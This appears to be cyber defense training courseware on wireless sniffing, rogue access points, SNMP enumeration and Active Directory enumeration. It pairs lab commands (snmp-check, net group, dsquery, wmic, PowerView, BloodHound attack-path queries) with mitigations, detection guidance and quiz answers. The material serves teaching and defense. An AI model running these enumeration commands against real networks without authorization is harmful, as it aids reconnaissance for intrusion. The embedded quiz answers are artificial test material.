Practical Defenses | Detecting Rogue Access Points
NOTE: The following steps continue from the previous task.

5. Observe that the device with BSSID 00:0f:66:05:a9:11 is transmitting wireless management packets with the same SSID PublicLibrary as the legitimate access point. 

This device is successfully emulating the legitimate PublicLibrary access point. Any device that connects to this rogue access point — even though they may experience uninterrupted service — are likely to have their entire communication captured by the attacker.

Practical Defenses | Detecting Rogue Access Point
 Enter the following Wireshark filter to locate all the 802.11 frames of type 12 — deauthentication frame:
wlan.fc.type_subtype == 12

Defenses Against Wireless Sniffing
The strongest defense against a Malicious Cyber Actor (MCA) eavesdropping on a mission partner's wireless communications is secure network implementation and administration. There are several key principles to consider when administering wireless networks.

﻿

Signal Strength
﻿
Since any device attempting to sniff a mission partner's wireless traffic must be able to receive the signals as they are transmitted from the WAP, reducing the coverage of the wireless network to only the necessary physical footprint of users that should access it is ideal. In this way, the wireless signals do not travel further than required. This signal strength is modulated by adjusting the power used by the transmitting WAP. A wireless signal that is too strong can lead to extended range that attacker may be able to access, for example from a coffee shop across the street.

﻿

Encryption
﻿
Encrypted communications is the bedrock on which the assurance of security is based. There have been several technologies developed since the advent of wireless networking to employ encryption to radio communications. These technologies have employed either stream ciphers, which encode plaintext messages bit-by-bit, or block ciphers, which encode data in fixed-size blocks to secure wireless traffic.

﻿

Wireless Encryption Protocol
﻿

Wireless Encryption Protocol (WEP) was the first attempt at securing wireless networks. Users realized that using a WAP in the clear caused gratuitous data loss to even non-savvy attackers. These attackers could connect to a network, turn on promiscuous mode, and steal login credentials, credit card numbers, and other private information. WEP was the first specification developed to encrypt wireless data and employs Rivest Cipher 4 (RC4) stream cipher encryption, though its use of the same key for all traffic has proven to be as insecure as transmitting in plaintext — an attacker needs fewer than 10 minutes of traffic monitoring to break the WEP key and read all captured traffic. This is largely due to the small Initialization Vector (IV) size of 24 bits. This random value serves as the starting point for the encryption of each individual frame and can easily be reused after a few hundred web requests in a crowded network. Once the adversary has two different frames with the same IV encrypted by the same static key, breaking the key is simple and the entirety of sniffed traffic is available to them. 

﻿

Wi-Fi Protected Access
﻿

When WEP was identified to be such a flawed standard, the wireless industry developed Wi-Fi Protected Access (WPA), which continues to employ the RC4 method for encryption, but instead applies that encryption in the stronger Temporal Key Integrity Protocol (TKIP). TKIP uses a larger keysize than WEP, a larger IV size, and employs a simple Message Integrity Check (MIC) to improve confidence in secure communication. Additionally, the key is dynamic — it changes for each packet, which solves another problem that WEP presented. The only way to potentially break WPA from sniffing the traffic is to capture the original authentication handshake and hope that the master key is small.

﻿

WPA2
﻿

In the second iteration of the WPA standard, the TKIP method was replaced with the Advanced Encryption Standard (AES)-based Counter Mode Cipher Block Chaining Message Authentication Code Protocol (CCMP). This encryption method employs the strongest accepted block cipher rather than the RC4 stream cipher and includes improved message integrity checking both encrypted and unencrypted data in communications.

﻿

When WPA2 is configured with a Pre-Shared Key (PSK), a single American Standard Code for Information Interchange (ASCII) password or passphrase is provided to the WAP and to any client devices that need to connect to it. This shared secret is only as strong as the trust in the users employing it. For this reason, this form of authentication is more commonly used in residential or public Wi-Fi environments, while 802.1x is preferred for enterprise networks.

﻿

Authentication
﻿

802.1x with Extensible Authentication Protocol – Transport Layer Security (EAP-TLS)
﻿

802.1x is a form of centralized network authentication in which a supplicant (client device) requests access to the network itself, then follows an authentication process that occurs at a dedicated authentication server, usually a Remote Authentication Dial-In User Service (RADIUS) server. In this model, the WAP is the authenticator device. This form of network authentication vastly increases the security of a wireless network obscuring all traffic behind encryption after the initial authentication handshake.

﻿

Authentication Handshake
﻿

When 802.1x authentication is not employed, authenticating to an access point utilizing WPA to communicate over the network is a four-step process. This process assumes the use of a master PSK. 

﻿

The master PSK can be used to create several derivative keys that are used in subsequent communications. It is important to understand these definitions of those subsequent keys:

Pairwise Master Key (PMK): The master key derived from the PSK for connections between a WAP and client device.
Pairwise Transit Key (PTK): The connection-specific key for all unicast communication between a WAP and client device.
Group Master Key (GMK): The master key derived from the PSK for broadcasts between a WAP and any client device.
Group Temporal Key (GTK): The connection-specific key for all multicast communication from a WAP.
ANonce: A connection-specific random value created by the WAP (authenticator).
SNonce: A connection-specific random value created by the client (supplicant).
Using these values, the temporal keys are created through a pseudorandom function that uses the PMK or GMK, ANonce, SNonce, client MAC address, and WAP MAC address. 

﻿

When the client initiates an authentication request, the following four-way handshake allows the exchange of the necessary keys.

﻿

1. The WAP provides the client with the ANonce used to create the PTK.

2. The client provides the WAP with the SNonce, encrypted with the PTK.

3. The WAP provides the client with the GTK, encrypted with the PTK.

4. The client confirms receipt of the GTK, encrypted with the PTK.

﻿

At this point, the client can encrypt and decrypt all unicast traffic with the PTK and encrypt and decrypt all multicast traffic with the GTK.

﻿

Virtual Private Networks
﻿

Virtual Private Networks (VPN) are a secure tunneling solution that allow encrypted access to trusted mission partner networks even when not physically connected to it. These solutions are essential for remote workers that may be using publicly available or even private wireless networks to access mission partner resources, because even if the rest of the infrastructure is secure, if a remote worker accesses sensitive material insecurely, then that material may be sniffed over the insecure wireless network.

Wireless Sniffing | Active Sniffing Techniques
Evil Twin Attack
﻿
Also known as the Rogue Access Point attack, this type of active technique augments wireless sniffing reconnaissance by capturing all sides of a conversation and proxying the traffic. This attack occurs when the threat adversary stands up an alternative WAP with the same SSID as the original legitimate access point. When an unwitting user believes that they are connecting to a known wireless network with the familiar SSID, all their requests are first sniffed and captured by the malicious device. This technique can be combined with DNS Cache Poisoning to direct users to malicious web domains where additional valuable data is sniffed. 

﻿

MAC Spoofing
﻿
MAC Spoofing is a useful technique for gaining access to a wireless network that is protected by a captive portal or some other form of network authentication that whitelists clients by MAC address. The attacker first alters their own machine's MAC address to emulate a known whitelisted device, then sends a stream of deauthentication packets to the target device so as to break the connection between that device and the access point on the client's end, thus stealing that network connection. Having achieved access to the network, the attacker can then continue in further reconnaissance, additional active sniffing measures, or continue passively sniffing traffic.

Wireless Sniffing | Overview
Overview
﻿

Wireless sniffing is a form of reconnaissance, potentially leading to host or even credential discovery in mission partner networks employing wireless technology.

﻿

MITRE defines this technique — both wired and wireless —  as the use of a network interface on a system to monitor or capture information sent over a wired or wireless connection and identifies it with the code T1040. This information may include authentication handshakes, name service resolution queries, service requests (revealing which services are active in a network), and a variety of metadata allowing the potential identification and fingerprinting of active hosts in the environment. 

﻿

This type of attack accomplishes information gathering for the threat adversary. There are a number of ways for this information to be gathered. 

﻿

Types
﻿

Wireless sniffing can be conducted either actively or passively. While the capture itself is always a passive action — it requires no interaction with other devices or services to capture — the amount and quality of the data can vary. 

﻿

Passive Sniffing
﻿

When an adversary's priorities are stealth and maintaining target network access, passive sniffing is the ideal route to follow. In this, the attacker does not interact with any targets, but simply takes advantage of wireless signals sent through a network and captures the packets that are being transmitted over the air.

﻿

Active Sniffing
﻿

When an adversary's priorities are information gathering, and stealth is an acceptable quality to risk, active sniffing allows for more potential data to be gathered. This type of sniffing is a combination of passive sniffing on one attacker machine and, on the same machine or, ideally — a separate one that is expendable. The injection of traffic leads to a breakdown in secure switching mechanisms or reliable authorities for name resolution or network access, leading to Man-in-the-Middle (MitM) access to data. This can allow the collection of traffic that would otherwise be encrypted.

﻿

Tradeoffs
﻿

The advantage of active sniffing is that the adversary gathers more valuable information. The cost is stealth, leading to potential discovery from network defenders. The advantage of passive sniffing is security of position, in that an attacker can quietly listen and remain undiscovered. The cost of passive sniffing is time. 

﻿

Goals
﻿

Threat adversaries employing wireless sniffing are attempting to acquire various types of information for use in follow-on exploitation, lateral movement, and privilege escalation. The following types of data can be obtained through analysis of raw Packet Captures (PCAP):

﻿

Host Information
﻿

The number, type, and names of various host and networking devices on the network are likely to be extracted from sniffing. The network communication contains various signatures such as Time to Live (TTL) numbers, Maximum Segment Size (MSS) values, or Transmission Control Protocol (TCP) window size, which contribute to an attacker's ability to passively identify the OSs of various hosts. If an attacker is able to capture traffic containing authentication traffic (e.g., Server Message Block (SMB) share access), then the available information includes hostnames, usernames, and service names on both ends of the exchange. If unencrypted, this collection can even include credentials.

﻿

Addressing
﻿

Sniffing also yields the IP addresses and MAC addresses of devices communicating on the same wireless network as the sniffing device. Only the MAC addresses of devices on the same Virtual Local Area Network (VLAN) are visible, but even this amount of segmentation is valuable knowledge to the attacker. Capturing and observing Address Resolution Protocol (ARP) requests and replies also aids in revealing this local VLAN architecture. 

Services

Even without running an active scan, a savvy threat adversary can determine which services are available in a wireless network by observing other devices accessing those service on common ports and over known protocols. This reveals not only whether services such as web, File Transfer Protocol (FTP), e-mail, network data storage, or others are running, but also on which specific devices and ports.

Wireless Networking Overview
Overview
﻿
The 802.11 family of radio protocols is commonly referred to as Wireless Fidelity (Wi-Fi). Wireless network traffic is sent over the 802.11 radio protocol, which spans Layer 1 (Physical Layer) and Layer 2 (Data Link Layer) of the Open Systems Interconnection (OSI) model. In Layer 1, the 802.11 defines the frequency (e.g., 2.4GHz and 5.0Ghz) and modulation, and in Layer 2, the protocol defines the device addressing. This family is subdivided into smaller protocols based on the frequency and rate of the data being transmitted. 

Wireless Access Points
﻿
Wireless Access Points (WAP) are wireless devices operating at layer 1 and layer 2, with some implementations providing additional layer 3 support, such as routing. They provide clients mobile access to network resources, point-to-point connectivity for Metropolitan Area Networks (MAN), and administrator connections to client devices over the 802.11 protocol. Each access point is located by its Service Set Identifier (SSID), though it is called an Extended SSID (ESSID) when multiple access points use the same SSID. The Media Access Control (MAC) address of the radio interface serving the network identified by a specified SSID is the Basic Service Set Identifier (BSSID) of that network. When a named network is administered by multiple access points, the ESSID consists of all BSSIDs serving the network. In such a case, it is possible to move from one room to another, change from one BSSID to another, but never change the ESSID of the network a device is connected to.

Channels

Channels are specific, narrower bands of the Radio Frequency (RF) spectrum over which a WAP operates. The numbers — 1 through 14 — in Figure 6.3-1 show the associated channels and 22 megahertz (MHz) overlapping RF bands used in 802.11 protocols.

Types of Frames
﻿

In the 802.11 wireless protocol, a number of management frames are used for announcing, creating, and removing connections to the network. 


Beacon

Beacon frames are periodic announcements of wireless network information, sent over the RF channel on which the WAP operates. The WAP broadcasts information such as the SSID, device capability (e.g., encryption details), supported data rates, interval between beacon transmissions, and miscellaneous details used for establishing RF communication with the WAP.


Deauthentication Frame

The deauthentication frame is sent when one party in the connection wishes to terminate the connection. This disassociates a device from the access point, so any reassociation requires new authentication when encryption is employed. When sent, this frame includes a reason code for the termination, which may be Deauthenticated because sending station is leaving BSS or Disassociated due to Inactivity; there are more than 60 such codes. Most importantly, in certain types of wireless attacks, these deauthentication frames are spoofed by an attacker to force a client device off a network to either assume its place or to force reauthentication. Figure 6.3-2 shows the structure of an 802.11 management frame where the reason code is sent. See the additional resources for more information on the various types of deauthentication reasons.

SNMP Overview
SNMP is a management protocol used to monitor and manage network devices. Most networking devices and components — including routers, switches, printers, servers, and workstations — support getting and setting various values associated with the configuration of the device. End-user devices and workstations are less likely to have SNMP turned on by default but may have it enabled through various methods, like group policy for Windows. SNMP is widely used by network administrators to monitor networking devices for items like bandwidth, uptime, temperature, errors, network connections, processes, routing tables, Address Resolution Protocol (ARP) tables, and additional values. A system that is configured to use SNMP is called a managed device. Managed devices use a service or software application — an agent — running on the device to interface with the device's internals and interact with a Network Management Station (NMS). An NMS consists of a terminal that uses SNMP to query and set various settings on managed devices, as well as receive device-originated push notifications. The various values that a device using SNMP provides to an NMS are contained in a Management Information Base (MIB), which describes the configuration and status of the local system. The agent translates the MIB values for use with SNMP.

﻿

Figure 6.4-1 shows a generalized concept of how an NMS and agent interact. Notice there are two main types of communication. Interactions that use the GET and SET SNMP commands can be uni-directional for setting values or bi-directional for queries. This communication occurs over User Datagram Protocol (UDP) port 161. Agents may also be configured to send unsolicited responses — using the TRAP command — to the NMS on UDP port 162 when certain thresholds are exceeded or on a periodic basis. This allows monitoring systems to get consistent updates on key variables and limits the amount of network traffic since the NMS does not send an explicit GET request.

﻿

﻿

Figure 6.4-1 — Image from Rene Bretz (updated by gh5046), CC BY-SA 3.0, via Wikimedia Commons

﻿

SNMP versions 1 and 2 use a community string — a text-based password — to separate read-only operations (typically indicated in configurations as ro) and set/write operations (typically rw or w). SNMP version 3 uses a user ID/password model for authentication instead of a community string. For decades, the default community strings have been the words public for read-only access and private for write access. Many networking devices still use these community strings by default. Network administrators often fail to change these community strings to something more secure, opening up these devices to provide sensitive information to anyone able to communicate with them using SNMP.

﻿

SNMP Versions
﻿

SNMP has three major versions of the protocol in use with various security and authentication implications relevant to defenders and system administrators. 

Table 6.4-2 describes the types of SNMP command — or protocol data units — that are available for each version of the protocol. Commands that are in the SNMPv1 version are available for all versions.

SNMP Enumeration
﻿

Enumeration is the process of systematically counting or retrieving something. The MIB used for SNMP consists of Object Identifiers (OID) that identify each item in the MIB. OIDs are hierarchical in nature and follow a tree that is based on standards established by various international standards organizations, including the International Organization for Standardization (ISO), the National Institute of Standards and Technology (NIST), and the Internet Engineering Task Force (IETF). SNMP OIDs are typically displayed in a dot notation to indicate the specific node in the tree. For example, the dot notation 1.3.6.1.2.1 may also be described as:

{iso(1) identified-organization(3) dod(6) internet(1) mgmt(2) mib-2(1)}
﻿
This OID example refers to the branch in the tree that deals with the management of internet devices. The bulk of the MIB-2 specification (also sometimes seen as MIB-II) is based on the internet standards defined in Request for Comments (RFC) 1213 and RFC 3418 and defines the MIB for network management of Transmission Control Protocol (TCP)/Internet Protocol (IP)-based internets. SNMP enumeration is systematically requesting — or following — the subordinate OIDs in the agent's MIB to retrieve all available data. The further down — or deeper — into the tree, the more specific the information contained in the referenced node. A small excerpt of OIDs associated with a router is shown in Figure 6.4-3. 

Notice that several OIDs were not decoded into a human-readable format. MIB repositories exist to assist in identifying the specific data held in an OID as vendors can define OIDs to hold a particular variable. Websites like oid-info.com compile the various standards-based and vendor-based MIBs and allow users to search for specific OIDs. Recall from Figure 6.4-2 that iso is the top-level node and can also be referenced with the number one. The OID repository at oid-info.com shows that the OID 1.3.6.1.2.1.10.131 is derived from RFC 4087 and is used to describe tunnel details.

﻿SNMP Enumeration | Techniques
There are many tools that network and system administrators use to interact with agents/devices. Attackers often use the same tools as a mechanism to blend in with legitimate activity. Both open-source and commercial network monitoring suites exist with varying levels of automation and ease of use. Both snmpwalk and snmp-check are common Linux command-line utilities that use SNMP GETNEXT requests to query an agent for a tree of MIB values. snmpwalk can request only a portion of the MIB by specifying an OID space to start using GETNEXT requests — essentially a sub-tree. In the following lab, trainees use two CLIs to review examples of the data that networking devices may expose through SNMP.


3. Run the command below to perform an SNMP enumeration against the 172.35.1.37 networking device:

$ snmp-check -c simspace 172.35.1.37 | less
﻿

Figure 6.4-5 shows the output of this command. The exact output differs when run as the output depends on the system's state at the time the information is queried.

﻿Automated Tools
﻿
Figure 6.4-6 shows the output of snmp-check from ch-core-rtr and the interfaces assigned to a device are shown in the Network IP: section of the output.

﻿

The Command-Line utilities discussed are useful for interacting on a host-by-host basis but are less useful to administrators managing large enterprises with hundreds or thousands of devices. Many commercial network management tools exist that use SNMP to periodically poll the health of these devices. These tools provide Graphical User Interfaces (GUI) and use SNMP requests for specific details. They can also set and receive SNMP Trap commands from network devices. Using automation and common SNMP configuration, administrators can identify network faults, availability issues, and monitor critical performance metrics. Two examples of commercial automated SNMP management solutions are from the companies SolarWinds and ManageEngine. Like most commercial SNMP management solutions, both have GUIs to browse the entire MIB for the various supported devices as well as the ability to show different visualizations of the states of the managed devices. Most attackers use CLI tools to interact with SNMP, so the commercial solutions are not discussed further in this course. 

﻿

SNMP Defense
﻿

While SNMP can be very useful for administrators, that same data can provide attackers a plethora of useful configuration information to further exploit and move within a network. If SNMP is not used or needed within a network, the best defense is to disable or remove the SNMP agents.

﻿

In networks that need to use SNMP, the following considerations need to be taken:

Ensure community strings used with version 1, 1c, or basic v3 (no authentication or privacy) have read-only access and NOT write access.

Ensure any community strings configured for write access use SNMPv3 with authentication.

Safeguard community strings — devices often store community strings in plain text.

Use Virtual Local Area Networks (VLAN) and firewall rules to limit SNMP traffic to networking devices and a set list of permitted management hosts.

Explicitly block UDP ports 161 and 162 not associated with management hosts.

Use IP Security (IPSec) to encrypt and protect SNMP traffic.

SNMP Analysis in Kibana
Analyzing SNMP activity in a network can be accomplished using a Security Information and Event Management (SIEM) like Security Onion using Kibana. In this scenario, the Cyber Protection Team (CPT) has been tasked to assist local defenders of the City Hall network. Threat intelligence indicates attackers may be using SNMP to gain detailed network configuration details in order to gain access and laterally move within similar city networks. City Hall administrators requested assistance due to the discovery of a router configuration posted on GitHub that contained the device's SNMP community string by accident and was publicly accessible. Local defenders have provided the following overview:

IP address space: 172.35.0.0/16

Public IP address: 104.53.222.32

Edge firewall: 156.74.85.2

Demilitarized Zone (DMZ): 172.35.3.0/24 (Network Address Translation [NAT] from ch-edge-rtr to public IP address)

SNMP: simspace community string, but not used by City Hall network administrators

A Deployable Mobile Support System (DMSS) kit has been attached to the City Hall core router using the 199.63.64.0/24 subnet

Take note of the above information and use it to analyze any SNMP activity in the following tasks.

﻿SNMP Enumeration Analysis
Two IP addresses originated SNMP requests in the time period: 128.0.7.205 and 199.63.64.51 — but since 199.63.64.51 is within the DMSS subnet range, 128.0.7.205 is likely associated with an attacker. It is the only source that is external to the network.

﻿
There is significant activity from the 199.63.64.51 IP address, which is internal to the DMSS kit subnet. When activity like this is discovered by defenders, communication is required to deconflict with the rest of the team to ensure that the activity is legitimate. Activity that originates from within an expected legitimate enclave still requires validation to ensure the security tools used by defenders have not themselves been compromised. 

﻿

The CPT team leader confirms the activity originating from 199.63.64.51 was other members of the team performing a survey and analysis of specific devices — this source can be filtered out as legitimate activity. Similarly known, SNMP management IP addresses can be filtered out as a part of a playbook to identify SNMP activity that may be suspicious.

1. Add a filter to exclude the source IP address 199.63.64.51. One method is to hover over the relevant IP address and select the minus sign.

Notice the event around 08:50 and the large gap until approximately 13:40 in Figure 6.4-11.

﻿

2. Select the event around 08:50 and analyze the results.

Notice the large number of responses — 4,382 OIDs were requested and the same number of responses. Recall from the earlier exercise how much data was returned from an snmpwalk enumeration and how long that quantity of data takes to analyze. The large time gap suggests an attacker performed a single successful SNMP enumeration of the 156.74.85.2 device and an analysis to plan additional hosts to target. Additional time gaps suggest similar actions with a shorter time for analysis needed since some information about the network had already been revealed. This analysis and planning is often seen in the attacker lifecycle as part of the discovery of externally accessible hosts, and then using that information to dig deeper into the network to identify and discover additional devices that may be vulnerable to attacks or abuse through their configurations. From one external enumeration, it appears enough information was revealed that the attacker was able to discover additional networking devices and gain even more configuration data. Since the same community string was used on more devices than the initially leaked configuration file, an attacker can use SNMP to map out a network to gain additional situational awareness. The vast majority of valid SNMP traffic only occurs between known hosts. SNMP traffic that communicates outside of the organization's network and internal SNMP traffic to non-management hosts is suspicious and should be investigated immediately.

SNMP Mitigation
SNMP agents are not installed or started by default on most Windows Operating Systems (OS). For Windows OSs, SNMP runs as a service and can be seen in the Services control panel. Disabling the SNMP service is one method to mitigate risk due to SNMP. Changing the community strings and restricting what hosts can reach the SNMP service are other ways to mitigate SNMP on Windows OSs. Routers and other networking devices are all different, but references to SNMP in the configuration files indicate if the agents are running. Mitigating these devices varies and the documentation should be consulted in order to ensure the appropriate configuration changes are made. The following workflow walks through the mitigation of SNMP on a Windows server.

2. Open the Services control panel and scroll down to SNMP Service.

In this case, the SNMP Service — the agent — is installed and running. The management service that would receive SNMP traps — SNMP Trap — is not running.

3. Open the SNMP Service properties, and select the Security tab:

Notice the simspace community string is listed with read-only rights, and this system is configured to Accept SNMP packets from any host. Limiting SNMP to management IP addresses only is one way to mitigate risk, as well as ensuring there are no write SNMP community strings. Configuring the SNMP agent to send Traps is made on the Traps tab. Microsoft has deprecated the use of SNMP in Windows OSs, so there is no native support for SNMPv3 with authentication. The use of Windows Management Instrumentation (WMI) or Windows Remote Management (WinRM) tools are the preferred and supported methods for obtaining the configuration and performance data of other systems using SNMP.

﻿

4. Select the General tab, stop the service, and set the Startup type to be Disabled.


5. Apply the changes, and select OK. 

﻿

The same steps can be used to disable the SNMP Trap service. While there is less risk from leaving the SNMP Trap service enabled, if it is not being used, the best practice is to remove or disable any services not intended to be used to reduce the potential attack surface. Group Policy Objects (GPO) can also be created to ensure the SNMP service is disabled or removed across Windows domains.

﻿Which Windows service responds to SNMP requests?
service

AD Enumeration Overview
AD enumeration is used by adversaries to gain information about an AD environment that can help them further their attack. The adversary needs access to a domain account before they can perform AD enumeration. This activity falls under the Discovery (TA0007) tactic of the MITRE ATT&CK® matrix.

﻿

Adversaries use both third-party tools and built-in system tools for AD enumeration.

﻿

Third-Party Tools
﻿

Numerous third-party tools have powerful AD enumeration capabilities. Such tools include the following:

BloodHound uses graph theory to help adversaries or defenders find complex attack paths in AD that they can then exploit or harden. This tool was used in CDA-Basic to enumerate an AD environment.

PowerSploit is composed of PowerShell modules that can be used to assist adversaries in all phases of their attack.

PowerView is a specific module within PowerSploit that adversaries can use for network and Windows domain enumeration and exploitation.

Built-in System Tools
﻿

Adversaries may also use built-in system tools (i.e., they may live off the land). Such tools include the following:

Directory Service Query (DSQuery) is a command-line utility that queries the objects in AD by employing user-specified search criteria.

AD PowerShell Module is a suite of PowerShell cmdlets that allow a user to query AD objects with Windows PowerShell. Some cmdlets in this suite used to gather information about a directory are as follows:

Get-AdUser

Get-AdDomain

Get-AdComputer

Get-AdGroup

Get-AdGroupMember

Get-AdObject

NET commands can be accessed through a Command-Line Interface (CLI) and are primarily used to manage network resources. However, adversaries may use NET commands to enumerate users, shares, computers, groups, local groups, and other AD objects.

Windows Management Instrumentation Command-Line (WMIC) can be used by adversaries to enumerate hosts. WMIC provides a utility usable through a CLI to do this. WMIC can be used to get information on processes, user accounts, and groups.

Enumeration is one of the most important steps of an attack. If it is performed well, it can provide an adversary valuable insights into how an AD environment is configured. It can also allow an adversary to find misconfigurations that leave the environment vulnerable to further exploitation.

﻿

This lesson focuses on the third-party tools BloodHound and PowerSploit and the built-in system tool NET.exe due to their wide use among adversaries.


Security Onion






A free and open-source platform for threat hunting, network security monitoring, and log management. Security Onion includes best-of-breed open-source tools such as Suricata, Zeek, Wazuh, the Elastic Stack, and others.


BloodHound/SharpHound






BloodHound is a data analysis tool that uses graph theory to reveal the hidden and often unintended relationships within an Active Directory environment. SharpHound is the collector that gathers the Active Directory information that is then imported into BloodHound.


PowerSploit/PowerView






PowerSploit is a collection of Microsoft PowerShell modules that can be used to aid penetration testers during all phases of an assessment. PowerView is part of the PowerSploit Recon module.


NET.exe

A Windows command-line tool to manage network resources.



﻿If an adversary planning to perform AD enumeration needs to live off the land, which tools could they use?
wmic dsquery net.exe

AD Review
AD is a database that contains information about objects on a network. Some of these objects are Organizational Units (OU), users, groups, computers, and Access Control Lists (ACL). Adversaries can query the objects to potentially find attack paths to follow to gain greater access.

﻿

CDA-Basic Modules 14 and 15 included AD concepts. Some of these concepts are summarized below.

﻿

AD Concepts
Directory: Stores all the information about objects.
Objects: References most items inside a directory (e.g., user, group, shared folder).
Domain: Stores directory objects.
Tree: Domain with the same root (vcch.lan, file.vcch.lan).
Forest: Group of trees connected by a trust relationship.
AD Directory Service Key Terms
Schema: The set of user-configured rules that govern objects and attributes in AD Directory Service (DS).
Global Catalog: The container for all objects in AD DS. For example, a name associated with a user or a computer is stored in the Global Catalog.
Query and Index Mechanism: This system allows users to find each other in AD. A good example is typing a recipient's name in a mail client and the mail client showing possible matches.
Replication Service: The replication service ensures that every Domain Controller (DC) on the network has the same Global Catalog and Schema.
Sites: Representations of the network topology, so AD DS knows which objects go together to optimize replication and indexing.
Lightweight Directory Access Protocol (LDAP): A vendor-agnostic, industry-standard application protocol that allows AD to communicate with other LDAP-enabled directory services across platforms. An example of its use is creating centralized management of AD users for validating access to various applications and services.
﻿

AD DS Services
Domain Services: The collection of software and processes that store information about the enterprise, including users and computers.
Certificate Services: This allows the domain controller to serve and authenticate digital certificates, signatures, and public-key cryptography.
Lightweight Directory Services: The foundation that supports LDAP.
Directory Federation Services: Provides Single Sign-On (SSO) authentication for multiple applications in the same session. SSO allows users to use only one set of credentials to log in to multiple applications.
Rights Management: The rules and configurations that control information rights and data access policies. The configurations defined using this service determine which users can access which files, folders, and applications.

AD Enumeration: Living off the Land
Living off the land is when an adversary uses tools already present on a system rather than downloading additional tools. Living off the land is stealthier than use of third-party tools because the system tools are likely the same tools the internal Information Technology (IT) and Security teams use for their jobs daily. This means the activity has a chance to blend in with normal noise that the Security Operations Center (SOC) often flags as false positive.

﻿

As mentioned before, several tools enable living off the land to perform AD enumeration. These tools typically do similar things, and the adversary will use whatever is available on the system.

﻿

As an example, an adversary could grab a list of users in the Domain Admins group using any one of the below system tools and their associated commands:

﻿

DSQuery
dsquery group -name "Domain Admins" | dsget group -members
AD PowerShell Module
Get-ADGroupMember -Identity "Domain Admins" 
NET.exe
net group "Domain Admins" /domain
WMIC
wmic /NAMESPACE:\\root\directory\ldap PATH ds_group where "ds_samaccountname='Domain Admins'" Get ds_member /Value

What is the benefit of living off the land rather than using a third-party tool for AD enumeration?
stealthier

AD Enumeration with NET.exe
The CPT has been assigned to a mission to audit an AD environment. A domain account has been provided to the CPT to assist local defenders. Enumerate the AD environment and identify misconfigurations that an adversary may be able to take advantage of.

﻿

3. Run the following command to check password login restrictions for the domain:

C:\Users\trainee>net accounts /domain
﻿
4. The CPT was provided a network map and knows the DC is ch-dc1. Run the following command to see if any shares are accessible:

C:\Users\trainee>net view \\ch-dc1

5. An open bkup share — which is likely used for backups — is on the DC. Connect and see what information this could provide an adversary.

C:\Users\trainee>net use x: \\ch-dc1\bkup
﻿
6. List what is in the share.

C:\Users\trainee>dir \\ch-dc1\bkup


7. Open the user-list.txt file in Notepad.

C:\Users\trainee>\\ch-dc1\bkup\user-list.txt
﻿

8. Check whether any of these users are in the Domain Admins group.

C:\Users\trainee>net group "Domain Admins" /domain
﻿
9. As indicated in Figure 6.5-6, the users did not show up in the Domain Admins group. Check the user details to see which groups they are in.

C:\Users\trainee>net user helpdesk /domain

C:\Users\trainee>net user lewis /domain
﻿
This audit was a success. A share was found that contained sensitive information an adversary could have used to advance access. It was also found that enumeration of user account details was successful using a non-admin domain user and without an elevated command prompt.

AD Enumeration: Third-Party Tools
Although living off the land can provide greater stealth, the more advanced capabilities provided by third-party tools are often necessary for an adversary to develop more efficient attacks.

﻿

This section focuses on the third-party tools PowerSploit/PowerView and BloodHound/SharpHound for performing AD enumeration.

﻿

PowerSploit/PowerView
﻿

PowerSploit is a post-exploitation framework of PowerShell modules that assists adversaries in execution, enumeration, persistence, exfiltration, lateral movement, and privilege escalation. PowerView is part of the PowerSploit Recon module and is the only element of PowerSploit this lesson covers.

﻿

To pull all the available commands for the Recon module, run the following command:


Get-Command -Module Recon
﻿

NOTE: This command can be used with any PowerShell module by replacing Recon with the module of interest.

﻿

Whereas NET.exe requires specifying the system to look for shares, PowerView can find all shares on the network without specifying the systems to check.


Find-DomainShare
﻿


PowerView is able to do this by using the Find-DomainComputer function to compile a list of domain computers and then uses Get-NetShare against the list of computers to check for available shares on each system. This can save an adversary valuable time if many systems are on the domain.

﻿

Additional find functions are listed below. Use Get-Command -Module Recon for a full list of commands.

Find-DomainUserLocation: Finds domain machines specific users are logged into.
Find-DomainProcess: Finds domain machines where specific processes are currently running.
Find-DomainUserEvent: Finds logon events on the current (or remote) domain for the specified users.
Find-DomainShare: Finds reachable shares on domain machines.
Find-InterestingDomainShareFile: Searches for files matching specific criteria on readable shares in the domain.
Find-LocalAdminAccess: Finds machines on the local domain where the current user has local administrator access.
Find-DomainLocalGroupMember: Enumerates the members of the specified local group on machines in the domain.
BloodHound/SharpHound
﻿

BloodHound is a powerful tool with unique functions that the tools discussed thus far do not have. BloodHound can perform such actions as listing all the Domain Admins but also more advanced functions, such as finding the shortest path to Domain Admins. In addition, BloodHound displays all its findings in an easy-to-read graph rather than a wall of text. This lesson does not delve deeply into the use of BloodHound, as it was covered in the CDA-Basic course, but it does discuss how to detect usage of BloodHound's collector SharpHound in later sections.

﻿

The list below provides all the pre-built analytics queries that come with a default BloodHound install. These queries can be found in the BloodHound interface after importing a SharpHound export.

Find All Domain Admins
Find Shortest Paths to Domain Admins
Find Principals with DCSync Rights
Users with Foreign Domain Group Membership
Groups with Foreign Domain Group Membership
Map Domain Trusts
Shortest Paths to Unconstrained Delegation Systems
Shortest Paths from Kerberoastable Users
Shortest Paths to Domain Admins from Kerberoastable Users
Shortest Path from Owned Principals
Shortest Path to Domain Admins from Owned Principals
Shortest Paths to High Value Targets
Find Computers Where Domain Users Are Local Admin
Find Computers Where Domain Users Can Read LAPS Passwords
Shortest Paths from Domain Users to High Value Targets
Find All Paths from Domain Users to High Value Targets
Find Workstations Where Domain Users Can RDP
Find Servers Where Domain Users Can RDP
Find Dangerous Rights for Domain Users Groups
Find Kerberoastable Members of High Value Groups
List All Kerberoastable Accounts
Find Kerberoastable Users with Most Privileges
Find Domain Admin Logons to Non-Domain Controllers
Find Computers with Unsupported Operating Systems
Find Authentication Service Response Message (AS-REP) Roastable Users (DontReqPreAuth)
﻿
Which command provides the members of the Domain Admins group as output?
Get-NetGroup 'Domain Admins'

Hunting for AD Enumeration
AD enumeration can be detected using several methods. This section focuses on use of Windows Security logs, Sysmon, and PowerShell script block logs to detect living off the land activity performed using NET.exe and to detect such third-party tools as PowerView and SharpHound. 

﻿
NET.exe
﻿

To detect NET.exe activity, Security event ID 4688: A new process has been created or Sysmon ID 1: Process creation is used. These event codes show the exact command that was run by the adversary. Determination of malicious or normal activity is based largely on the type of account running a net group command. A non-admin account running a net group command to list all Domain Admins is quite suspicious, given that most users do not know how to do this. An admin running the command is much less suspicious, and more context would be needed to determine how malicious the activity is.

﻿

